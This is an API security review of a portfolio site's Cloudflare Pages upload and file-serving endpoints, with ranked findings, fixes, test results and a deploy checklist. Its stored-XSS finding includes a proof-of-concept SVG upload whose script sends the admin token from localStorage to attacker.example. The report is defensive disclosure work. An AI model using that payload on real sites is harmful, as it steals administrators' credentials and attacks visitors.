# API security review — Cloudflare Pages Functions upload surface

**Repo:** `/home/logic/Work/portfolio` · **Branch:** `main` · **Commit:** `723538c`
**Reviewed:** 2026-11-03 (Asia/Kathmandu)
**Scope:** `functions/api/**` (all Pages Functions), `src/app/admin/page.tsx` (the
only client), `wrangler.toml`, the static route tree the scanner named
(`src/app/writing/[slug]/page.tsx`, `out/writing/**`).
**Out of scope / not modified:** `public/_headers`, `next.config.ts`,
`src/app/**`, `package.json`, `wrangler.toml`, `out/`. Site-wide static
response headers are reviewed separately by the teammate handling
`public/_headers`.
**Method:** full source read; live read-only probes of the deployed site
(`GET`/`HEAD`/one empty `POST` to prove a 405); the real handler files executed
against a mocked KV namespace (68 assertions); and the old vs. new
`/api/file` handler loaded into real Chromium to prove/deny script execution on
origin. No authenticated requests were made (no admin token), no files were
deleted, and the deployed site was not modified.

> **Status of the fixes:** they exist in the working tree of this checkout only.
> **Production is still running the pre-fix code** until the Lead builds and
> deploys the Pages project (Section 10). The live probes below are pre-fix.

---

## 1. Verdict on the HybridSec-QA "Zero-Day Radar" lead

**FALSE POSITIVE — 100%.** The URL the scan flagged is a static blog article.
There is no upload endpoint, no file input, no multipart handling and no
request-time code path at `/writing/<slug>` at all. The scanner's suggested
test (upload a polyglot/SVG/oversized file to that route) cannot be performed
there: the route answers `GET 200 text/html` and `POST 405`.

Evidence, in order of strength:

1. **Route tree.** The only Functions routes in the repository are:
   `functions/api/upload.js`, `functions/api/file/[[key]].js`,
   `functions/api/list.js`, `functions/api/delete.js`,
   `functions/api/health.js`. There is no `functions/writing/**`, no
   `_middleware.js`, and no other handler anywhere in the repo. Pages Functions
   are the only request-time code; the rest of the site is a Next.js *static
   export* (`next.config.ts` → `output: 'export'`, `wrangler.toml` →
   `pages_build_output_dir = "out"`).
2. **The page source has no ingress.** `src/app/writing/[slug]/page.tsx` is a
   server component that calls `getPost(slug)` and renders committed Markdown
   with `dangerouslySetInnerHTML`. It exports only `generateStaticParams`,
   `generateMetadata` and `Post`; it receives no request body, no form, no file.
   The slug list comes from `content/writing/*.md` at build time.
3. **The output is static HTML.** `out/writing/my-checks-were-green-they-were-checking-40-of-85-files.html`
   exists in the repo's build output (plus the RSC `.txt` payloads). Live
   inspection of that URL (`2026-11-03 ~05:05 UTC`) returned
   `200`, `content-type: text/html; charset=utf-8`, and the body contained
   **0** occurrences of `<form`, `type="file"`, `enctype=`, `multipart`,
   `/api/upload` or `/api/file`.
4. **The method that would be needed does not exist.** `POST` to the flagged
   URL → `405`, empty body. `POST` to `/api/file/<anything>` → `405` as well
   (that module exports only `onRequestGet`).
5. **The slug is a blog post about CI verification.** It is not about uploads;
   the word "upload" does not appear in the article. The scanner appears to
   have turned a content page into a guessed "upload endpoint" from a
   low-confidence heuristic; its own 50% confidence was the tell.

The **real** upload surface is `POST /api/upload` (token-gated) and the read
surface is `GET /api/file/<key>` (public by design). Section 3 onward audits
those. The lead must be closed as a false positive; the fix work belongs to
`functions/api/file/[[key]].js`, not to the blog route.

---

## 2. Surface map

| Route | Methods | Auth | State change | Storage / limits | Purpose |
|---|---|---|---|---|---|
| `/api/upload` | POST | `x-admin-token` == `ADMIN_TOKEN` | creates KV key | KV `MEDIA`, `uploads/` prefix, 24 MiB/file, 25 MiB KV value cap | store one file |
| `/api/file/<key>` | GET | **none (public by design)** | no | KV read | serve a stored file |
| `/api/list` | GET | `x-admin-token` | no | KV list | file metadata for the admin UI |
| `/api/delete` | POST | `x-admin-token` | deletes KV key | KV delete, `uploads/` prefix enforced | delete one file |
| `/api/health` | GET | none | no | — | config booleans + limit for diagnostics |
| `/writing/<slug>` | GET (405 on other methods) | none | no | static `out/` file | blog article (the false positive) |

Everything is stored in one KV namespace bound as `MEDIA`
(`wrangler.toml`), keyed `uploads/<epoch-ms>-<6 random base36>-<sanitised name>`.
`ADMIN_TOKEN` is deliberately **not** in `wrangler.toml` (public repo); it is a
Pages encrypted variable and every state-changing handler fails **closed**
(`503`) when it is unset — verified.

---

## 3. Findings summary (ranked)

| # | Severity | Finding | Status |
|---|---|---|---|
| F1 | **Medium** | Stored XSS: uploaded SVG served `inline` from the site origin with a client-controlled `Content-Type`, no `nosniff`, no CSP. Confirmed executable in Chromium; yields the admin token from `localStorage`. | **Fixed** (verified old vs. new in Chromium) |
| F2 | Low | API JSON responses had no `X-Content-Type-Options`; the token-authenticated `/api/upload` response was cacheable (no `cache-control: no-store`) | **Fixed** |
| F3 | Low | `/api/file/<bad %>` throws an uncaught `URIError` → live `500` (Cloudflare `error code: 1101`) instead of `400` | **Fixed** |
| F4 | Low | The 24 MiB limit is checked only **after** `request.formData()` has buffered the whole body (platform limit is 100 MB) — memory/CPU amplification before the 413 | **Mitigated** (pre-buffer `Content-Length` gate; residual for chunked bodies, see §7) |
| F5 | Low/Info | `/api/delete` with an empty/over-512-byte key reaches KV and throws → `500`; control characters accepted | **Fixed** |
| F6 | Info | `/api/health` publicly discloses whether `MEDIA` is bound and whether `ADMIN_TOKEN` is set (booleans only, never values) | Accepted (deliberate diagnostics; optional gate) |
| F7 | Info | No content-type/extension allowlist on upload | **Accepted by design** — safe-serve is the correct control here (§7) |
| F8 | Info | Token compare has a length-only timing difference and there is no rate limiting on token attempts | Accepted (not exploitable; rate limiting is a platform control) |
| N1 | Not a finding | Path traversal / key injection in `/api/file` or `/api/delete` | No filesystem; KV keys are opaque. Verified |
| N2 | Not a finding | `/api/list` leaks metadata to unauthenticated users | Returns `401` before touching KV (live + unit-verified) |
| N3 | Not a finding | Auth bypass / fail-open when `ADMIN_TOKEN` unset | Fails closed `503`; verified for all three token endpoints |
| N4 | Not a finding | Scanner lead: upload endpoint at `/writing/<slug>` | FALSE POSITIVE (§1) |

No SQL/NoSQL, command injection, SSRF, file-write-to-exec, or CSRF surface
exists: the Functions only touch one KV namespace, never a shell, never a URL
fetch, and auth is a custom header (which a cross-origin browser form cannot
set without a preflight the API never answers). Uploaded bytes are never
parsed or executed server-side; they are stored and served verbatim.

---

## 4. Detailed findings

### F1 (Medium, fixed) — Stored XSS via uploaded SVG served from the site origin

**What the code did.** `functions/api/upload.js` stored the browser/API-supplied
MIME type verbatim (`const type = file.type || "application/octet-stream"`).
`functions/api/file/[[key]].js` then echoed it as `Content-Type` and chose
`Content-Disposition` from it:

```js
const inline = /^(image|video|audio)\//.test(type) || type === "application/pdf";
// headers: content-type: type, content-disposition: inline|attachment, cache-control, etag
```

`image/svg+xml` matches `image/*`, so it was served `inline`, from
`sushantpoudel2028.com.np`, with **no `X-Content-Type-Options: nosniff` and no
`Content-Security-Policy`**. SVG is an active document: a top-level navigation
to it runs its `<script>` in the site's origin. The stored type is
attacker-controlled on a direct API call (multipart part `Content-Type`), so a
browser's own File-type normalisation is not a control.

**Exact request/response reasoning.**

1. Attacker with the admin token (or an admin tricked into uploading a
   "logo") sends:

   ```http
   POST /api/upload HTTP/2
   x-admin-token: <ADMIN_TOKEN>
   Content-Type: multipart/form-data; boundary=b

   --b
   Content-Disposition: form-data; name="file"; filename="logo.svg"
   Content-Type: image/svg+xml

   <svg xmlns="http://www.w3.org/2000/svg"><script>
     fetch("https://attacker.example/?t=" + encodeURIComponent(localStorage["portfolio-admin-token"]))
   </script></svg>
   --b--
   ```

   Response `200 {"ok":true,"key":"uploads/…-logo.svg","type":"image/svg+xml",…}`.
2. Anyone — the admin, or a visitor following a link on the trusted domain —
   opens `/api/file/uploads/…-logo.svg`.
3. Pre-fix response: `200`, `content-type: image/svg+xml`,
   `content-disposition: inline`, no nosniff, no CSP → the script runs on
   `https://sushantpoudel2028.com.np`, and the admin token is exfiltrated from
   `localStorage` under the key `portfolio-admin-token` (the admin page stores
   it there; it is **not** an HttpOnly cookie).

**Confirmed, not theorised.** The pre-fix handler (loaded from
`git show HEAD:functions/api/file/[[key]].js`) and the fixed handler were run
against the same mocked KV entry and loaded in real Chromium (Playwright,
headless Chromium from the local install):

```json
{
  "old_handler_svg":          { "title": "SCRIPT-EXECUTED", "xss_attr": "1" },
  "new_handler_svg":          { "title": "",                "xss_attr": null  },
  "new_handler_image_embed":  { "title": "IMG-RENDERED-200", "naturalWidth": 200 },
  "new_handler_html_download": true
}
```

Header comparison for the same stored bytes:

| Header | old handler | new handler |
|---|---|---|
| `content-type` | `image/svg+xml` | `image/svg+xml` |
| `content-disposition` | `inline; filename="evil.svg"` | `inline; filename="evil.svg"` |
| `x-content-type-options` | **absent** | `nosniff` |
| `content-security-policy` | **absent** | `sandbox; default-src 'none'` |
| `content-type` (`.html` upload) | `text/html` | `text/html` |
| `content-disposition` (`.html` upload) | `attachment` | `attachment` + nosniff + CSP |

**Impact — what an XSS here would and would not gain.** It is a genuine
stored XSS on the production origin, but it is **not** unauthenticated: only a
holder of `ADMIN_TOKEN` can create the file. Realistic paths are (a) token
already stolen/leaked, and the XSS is persistence/impact amplification, or
(b) social engineering an admin into uploading an SVG that runs when the
resulting link is opened. Because it executes on the trusted origin, the
resulting link can also be used to attack visitors.

- **Would gain:** read `localStorage["portfolio-admin-token"]` → the shared
  `ADMIN_TOKEN` itself, i.e. full persistent media-admin capability
  (list/upload/delete) until the token is rotated in the Pages dashboard;
  rewrite the DOM/overlay phishing under the trusted origin; read any other
  same-origin storage; keep the payload live in KV until deleted.
- **Would not gain:** HttpOnly cookie sessions (none exist — the token *is* the
  credential and it is in `localStorage`, so XSS reads it); other users'
  sessions (single-admin site, no accounts); Cloudflare dashboard access; the
  KV namespace or Workers env directly (JS cannot read server env — but the
  `localStorage` copy yields the same server capability); filesystem access or
  RCE (Workers runtime, uploaded bytes are only stored/served, never parsed or
  executed); the ability to upload without a token in the first place.

Severity is Medium rather than High because of the authentication prerequisite
and the single-admin blast radius; CVSS 3.1 lands in the Medium band
(~4.8–6.9 depending on whether the token theft is scored as `C:L` or `C:H`,
`AV:N/AC:L/PR:H/UI:R/S:C`). If the token is ever shared between people, or the
panel is used to serve confidential material, re-rate as High.

**Fix applied** (`functions/api/file/[[key]].js`):

- `x-content-type-options: nosniff` on **every** response (200, 304, 400, 404,
  503).
- `content-security-policy: sandbox; default-src 'none'` on every response.
  `sandbox` without `allow-scripts` means an inline SVG/XML upload cannot run
  script on this origin; `default-src 'none'` means it cannot load anything.
- `Content-Disposition: attachment` remains for everything except
  image/video/audio/PDF (already true pre-fix, now paired with nosniff + CSP so
  a mis-declared type cannot be navigated as a document).
- SVG stays `inline` so the site's embedded images (`<img src="/api/file/…">`)
  keep rendering — verified `naturalWidth: 200` through the fixed handler in
  Chromium. This is a *response* header on the file, not a page policy, so it is
  not inherited by the embedding page; the preview is unaffected.
- Content type is normalised on upload (`image/*` etc. lower-cased, only a bare
  `type/subtype` token accepted, otherwise `application/octet-stream`), and
  re-sanitised on serve (control characters stripped, capped at 120 bytes,
  fallback `application/octet-stream`) so a hostile stored header value can
  never make `new Response` throw or split a header.
- File names are re-sanitised on serve (CR/LF, quotes and backslashes stripped)
  even though `safeName()` on upload already does this — `Content-Disposition`
  must not depend on every future writer of the KV namespace (CWE-113 defence
  in depth; not currently exploitable because upload sanitises).

**Trade-off, documented.** SVG is the only `image/*` type that can execute
script; it is kept inline for rendering convenience and neutralised with CSP
instead of being forced to download. If uploaded SVGs are only ever used as
images (not opened directly), changing `image/svg+xml` to `attachment` is the
stronger option; it is a two-line change in the `inline` expression. Browsers
that ignore CSP would still be exposed to the SVG payload, but the CSP
`sandbox` directive is supported by all current evergreen browsers. Verified in
Chromium; the header is inert for PDFs/AV (handled by their out-of-process
viewers/players, not as web documents).

### F2 (Low, fixed) — missing headers on API JSON responses

`/api/upload` returned JSON with only `content-type` (no `cache-control`, no
`nosniff`); `/api/list`, `/api/delete`, `/api/health` had `no-store` but no
`nosniff`. API responses are `application/json` and are not rendered as
documents, so this is Low, but it is a one-line hardening and it removes the
difference between the static responses (which already carried `nosniff` live)
and the Functions. All JSON helpers now send `cache-control: no-store` +
`x-content-type-options: nosniff`; the upload response is now `no-store`
before it echoed neither.

### F3 (Low, fixed) — malformed percent-encoding → 500

`decodeURIComponent()` was called outside a `try`. Live probe:

```
GET /api/file/%E0%A4%A  →  HTTP/2 500  ... error code: 1101
```

Uncaught `URIError` inside the Worker → Cloudflare 1101 page. Not a data leak,
but it is a free unauthenticated error-generation endpoint and it violates the
route's own contract (`400 missing key` exists for bad input). Now wrapped:
bad encoding → `400 malformed key`, empty key → `400 missing key`. Verified
against the handler and documented in the checks (68/68).

### F4 (Low, mitigated) — size limit enforced only after full buffering

`await request.formData()` parses the entire multipart body into memory before
`file.size > MAX_BYTES` is evaluated. A caller can therefore make the Worker
buffer up to the platform request-body limit (100 MB on Workers) to receive a
413 at 24 MiB — wasted memory/CPU per request. Added a cheap pre-buffer gate:
`Content-Length > MAX_BYTES + 64 KiB → 413` before `formData()`. Verified that
`formData()` is never called for the oversized case.

Residual: a chunked body with no `Content-Length` still reaches `formData()`
before the exact check. Workers/Pages normalise most client traffic and the
platform caps the body at 100 MB, so this is a modest amplification rather than
a DoS; the platform-level fix (Cloudflare WAF request-size / rate-limit rule on
`/api/upload`) is outside this repo and is listed in §10.

### F5 (Low/Info, fixed) — delete key validation

`/api/delete` accepted `{key: ""}` (KV delete no-op → `200`, misleading) and
keys longer than KV's 512-byte limit (KV throws → `500`). It also passed
control characters through. Now: empty key, key > 512 bytes, or any
`\u0000-\u001f\u007f` → `400`; the `uploads/` prefix check still enforces the
namespace boundary. `..` is *not* rejected because it is a legitimate opaque KV
key character — see N1.

### F6 (Info, accepted) — `/api/health` configuration disclosure

Live: `GET /api/health → 200 {"ok":true,"media":true,"adminToken":true,"onPages":true,"limits":{"maxBytes":25165824}}`.
This is intentional (it lets the admin panel self-diagnose a misconfigured
deployment) and leaks only booleans, never the token or namespace id. It does
confirm to an attacker that the upload surface is enabled, which is already
obvious from the admin page. Accepted; if desired, gate it behind the token or
drop `adminToken` from the payload — not changed here to avoid changing the
documented behaviour.

### F7 (Info, accepted) — no content-type/extension allowlist

Deliberately not added. The product legitimately stores PDFs (papers), CVs,
certificates, `.zip` archives, images and video — a short allowlist would break
the site's own content and a long one would still include SVG/HTML, so it buys
little. The control that actually removes the danger is safe-serve:
`attachment` for non-media types + `nosniff` + CSP `sandbox` + type
normalisation (F1). Size *is* capped (24 MiB, matching the KV 25 MiB value
cap). Keys are never used as filesystem paths, so extensions cannot influence
routing or execution.

### F8 (Info, accepted) — token comparison and rate limiting

The compares are sound: length check first, then XOR-accumulate over the
expected bytes (`upload.js`, `delete.js`), or min-length XOR with a
length-mismatch bit (`list.js`). They are "constant-time-ish" JS rather than
strictly constant-time (early return on length reveals the token *length*, and
`charCodeAt` on equal-length strings is not a hardware-constant-time
primitive), but there is no meaningful oracle: an attacker learns only the
secret's length and gets `401` otherwise; token entropy is whatever the operator
chose. What is missing is attempt rate limiting — a network control. Recommend a
Cloudflare rate-limiting rule on `/api/*` (token guessing is infeasible only if
the token is long/random; see the rotation note in §10).

### N1 (not a finding) — path traversal / key injection

KV keys are opaque strings, not filesystem paths: `..`, `%2e%2e%2f`, encoded
slashes and null bytes have no traversal semantics — the only way they matter is
if they equal an existing key. Verified live and in the harness:

- `GET /api/file/uploads%2F..%2Ffoo` → decodes to the literal key
  `uploads/../foo`, KV miss → `404`.
- The fixed handler additionally refuses to serve anything outside `uploads/`
  (404, same body as a missing key, so it is not a prefix oracle).
- `POST /api/delete {"key":"uploads/../other/keep-me"}` deletes the literal
  key (no-op) and does not touch `other/keep-me`; anything not starting with
  `uploads/` is `400`.
- Decoding is per path segment then joined with `/`; a malformed `%` sequence
  is a `400` (F3), not a crash.
- The only real injection surface was the stored MIME type → header value
  (F1/F2), not the key.

### N2/N3 (not findings) — auth

Live `GET /api/list` without a token → `401 {"error":"unauthorized"}` with
`cache-control: no-store` and no file names. All three token endpoints check
`ADMIN_TOKEN` **before** touching KV and return `503` when it is unset, i.e.
fail closed (verified for unset/empty token in the harness). `GET /api/file` is
public by design — it is the site's media CDN; see the accepted-risk note in
§10 (uploads are public-by-URL; do not store confidential material there).
There is no cookie auth, so no CSRF and no HttpOnly-session theft vector; the
custom header means a cross-origin form-based CSRF is not possible, and no CORS
headers are emitted by the Functions, so cross-origin reads are blocked by the
browser.

---

## 5. Response-header changes (before → after)

| Response | Before | After |
|---|---|---|
| `/api/file/<key>` 200 (image/pdf) | `content-type`, `content-disposition: inline`, `cache-control: no-cache, must-revalidate`, `etag` | + `x-content-type-options: nosniff`, + `content-security-policy: sandbox; default-src 'none'` |
| `/api/file/<key>` 200 (other types) | `content-disposition: attachment` | + nosniff, + CSP |
| `/api/file/<key>` 304 | `etag`, `cache-control: no-cache` | + nosniff, + CSP |
| `/api/file/<key>` 404 | `cache-control: no-store` | + `content-type: text/plain`, + nosniff, + CSP |
| `/api/file/<bad key>` | uncaught `URIError` → 500 (1101) | `400 malformed key` + nosniff/CSP |
| `/api/upload` 200/4xx | `content-type: application/json` | + `cache-control: no-store`, + `x-content-type-options: nosniff` |
| `/api/list` 200/401 | `content-type`, `cache-control: no-store` | + nosniff |
| `/api/delete` 200/4xx | `content-type`, `cache-control: no-store` | + nosniff |
| `/api/health` 200 | `content-type`, `cache-control: no-store` | + nosniff |

Cache policy for `/api/file/<key>` is intentionally unchanged: the zone
rewrites origin `max-age` to its own browser-cache TTL, so the comment in the
file (revalidate-always with an ETag) is the correct, tested behaviour; deletes
propagate through a cache-busting query in ~10 s and that is KV eventual
consistency, not a header. Auth'd JSON is `no-store` (upload now included).

---

## 6. What changed (all in `functions/api/`; nothing else touched)

| File | Change |
|---|---|
| `functions/api/file/[[key]].js` | Security headers (nosniff + CSP sandbox) on every response; `uploads/` prefix boundary; try/catch around URL decoding → 400; re-sanitise stored type and filename; ETag helper hardened; comments explain the safe-serve trade-off. Inline behaviour for image/video/audio/PDF preserved. |
| `functions/api/upload.js` | `no-store` + nosniff on JSON responses; pre-buffer `Content-Length` 413 gate; declared type validated to a bare `type/subtype` and lower-cased (or `application/octet-stream`); `MAX_MB` constant reuse. |
| `functions/api/delete.js` | nosniff; reject empty/over-long keys and control characters (KV 512-byte limit) with 400. |
| `functions/api/list.js` | nosniff on JSON. |
| `functions/api/health.js` | nosniff on JSON. |

Deliberately **not** changed: `wrangler.toml` (binding/secret arrangement is
correct), `public/_headers` (separate owner; site-wide CSP there does not apply
to Functions responses), `next.config.ts`, `src/app/**`, `package.json`, `out/`,
and no `git` state was modified (`git show` was used read-only to obtain the
pre-fix handler for the differential test). The worktree also contains changes
outside this review (SECURITY.md, public/_headers, scripts/postbuild.sh,
src/app/robots.ts, public/.well-known/, scripts/check-security-output.sh) made
by other contributors — not reviewed here and not modified by this audit.

---

## 7. Size and type policy (rationale)

- **Limit:** `MAX_BYTES = 24 MiB`, matching the documented KV 25 MiB value cap;
  `/api/health` advertises the same number. Enforced exactly on the parsed
  `File` plus a cheap `Content-Length` pre-check before buffering (F4).
- **No allowlist:** argued in F7. The site's own content is heterogeneous
  (PDF papers, certificates, archives, images), so denial is the wrong tool;
  safe-serve is applied uniformly instead.
- **Stored type:** normalised to a bare, lower-case `type/subtype` token (or
  octet-stream). This preserves legitimate types while guaranteeing the value
  echoed later is a safe header value.
- **Disposition:** inline only for `image/*`, `video/*`, `audio/*` and
  `application/pdf`; attachment for everything else. This is the documented
  trade-off: it keeps `<img>` previews and PDF links working, and the CSP
  sandbox neutralises the single active type (SVG) that remains inline.

## 8. Verification performed

1. `node --check` on every changed file — **all pass** (`upload.js`,
   `file/[[key]].js`, `list.js`, `delete.js`, `health.js`).
2. Handler-level harness (real files, mocked `Request`/KV, no network): **68/68
   assertions pass**, covering: SVG inline + CSP + nosniff; `text/html`
   attachment; raster/PDF inline; archive attachment; missing/invalid/encoded
   keys; catch-all array params; ETag 304 path; CRLF in stored metadata; upload
   auth (missing/wrong/wrong-length/unset token), size (pre-buffer gate, exact
   size, empty), type normalisation, filename sanitisation; list auth +
   prefix + ordering; delete auth, prefix boundary, `..` semantics, size/control
   character validation; health shape and header hygiene.
3. Old-vs-new differential in real Chromium (§F1): old handler
   `SCRIPT-EXECUTED`; new handler script blocked; `<img>` embed still renders
   (`naturalWidth: 200`); `text/html` upload triggers a browser download.
4. Live read-only probes (pre-fix) confirming the deployed behaviour and the
   false-positive route: `/api/health` 200 (booleans), `/api/list` 401,
   `/api/file/does-not-exist-test` 404, `/api/file/%E0%A4%A` 500 (1101),
   `/writing/<slug>` 200 `text/html` with 0 form/file markers, `POST` to it
   405.

## 9. What remains (residual risk and follow-ups)

1. **Deploy the fix.** Production is still pre-fix. Functions ship with the
   Pages build (the `functions/` directory is auto-detected), not with `out/`.
2. **Rotate `ADMIN_TOKEN`** after deploy (Pages → Settings → Variables and
   secrets → edit, then redeploy) and re-save it in the admin browser. Rationale:
   the old stored-XSS window (and the public repo/dashboard history) means the
   token should be treated as potentially exposed; rotation also invalidates any
   token that a planted SVG could have exfiltrated.
3. **Optional stronger SVG handling:** force `attachment` for
   `image/svg+xml` if uploaded SVGs are only used as images.
4. **Platform controls** (outside this repo): rate limiting on `/api/upload`
   and `/api/file` (bandwidth/abuse) and a request-size rule if the chunked
   pre-buffer residual matters; `wrangler`-level request limits are a
   Cloudflare configuration task.
5. **Longer term:** replace the shared `localStorage` token with a proper
   session (HttpOnly/Secure/SameSite cookie issued by a Function, or Cloudflare
   Access in front of `/admin`). Then an XSS can no longer read the credential;
   it could still act in the victim's browser, but the persistent-takeover
   impact of F1 drops sharply. This is a design change, not a patch.
6. **Storage note (accepted risk):** `/api/file/<key>` is public by design and
   keys embed the original filename and upload minute. Files are therefore
   public-by-URL and not access-controlled; do not upload confidential material
   to the media namespace (use R2 with signed URLs or a separate private store
   if that changes). This is documented behaviour, not a vulnerability.

## 10. Deploy checklist for the Lead

- [ ] Build (`npm run build`; Lead-owned) and deploy the Pages project; confirm
      `functions/api/*` shipped (functions are not in `out/`).
- [ ] `curl -sI https://sushantpoudel2028.com.np/api/file/<an existing key>` →
      expect `x-content-type-options: nosniff`,
      `content-security-policy: sandbox; default-src 'none'`, and
      `content-disposition` inline for image/PDF, attachment otherwise.
- [ ] `curl -s -o /dev/null -w '%{http_code}\n' 'https://sushantpoudel2028.com.np/api/file/%E0%A4%A'`
      → `400` (was `500`).
- [ ] `curl -s https://sushantpoudel2028.com.np/api/list` → still `401`.
- [ ] Admin smoke test: token entry, image preview renders, small upload works,
      delete works; confirm `/api/health` still reports both flags true.
- [ ] Rotate `ADMIN_TOKEN`, redeploy, re-save in the admin browser.
- [ ] Re-scan the URL from the scanner lead and close it as **FALSE POSITIVE**
      (with §1 evidence); the actual upload surface is `/api/upload` (POST,
      token) / `/api/file/<key>` (GET, public).
- [ ] Site-wide `_headers` CSP (separate change) complements this but does not
      cover Functions responses; keep the sandbox CSP on `/api/file/*`.

## Appendix A — exact header transcript, pre-fix (live, 2026-11-03 ~05:05 UTC)

```
GET /api/health                        -> 200 application/json, cache-control: no-store        (no nosniff)
GET /api/list (no token)               -> 401 application/json, cache-control: no-store        (no nosniff)
GET /api/file/does-not-exist-test      -> 404 text/plain, cache-control: no-store              (no nosniff, no CSP)
GET /api/file/%E0%A4%A                 -> 500 text/plain "error code: 1101"                      (uncaught URIError)
POST /api/file/x                       -> 405 (only onRequestGet exported)
GET /writing/<flagged-slug>            -> 200 text/html; 0 <form, 0 type="file", 0 enctype, 0 /api refs
POST /writing/<flagged-slug>           -> 405
```

## Appendix B — reproduction commands

```bash
# syntax gate
cd /home/logic/Work/portfolio
node --check functions/api/upload.js
node --check 'functions/api/file/[[key]].js'
node --check functions/api/list.js functions/api/delete.js functions/api/health.js

# handler harness: copy functions/ into a temp ESM package and run the checks
# (the audit run used 68 assertions against mocked KV; import the real files,
#  never the deployed site)
```

*Findings are reported with their severity, exploit preconditions and residual
risk. F1 was demonstrated end-to-end (old handler vs. new handler in Chromium),
not inferred from headers alone.*
